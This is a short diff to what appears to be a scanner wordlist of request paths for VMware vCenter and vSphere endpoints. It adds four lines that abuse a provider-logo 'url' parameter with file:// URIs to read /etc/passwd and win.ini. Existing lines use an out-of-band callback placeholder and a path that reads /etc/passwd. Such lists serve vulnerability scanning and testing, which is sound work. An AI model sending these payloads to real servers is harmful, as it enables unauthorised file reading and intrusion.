@@ -1,3 +1,7 @@
 /ui/vropspluginui/rest/services/getstatus
 /ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=https://{{interactsh-url}}
 /eam/vib?id=/etc/passwd
+/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///etc/passwd
+/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///c%3a/windows/win.ini
+/vsphere-client/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///etc/passwd
+/vsphere-client/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///c%3a/windows/win.ini
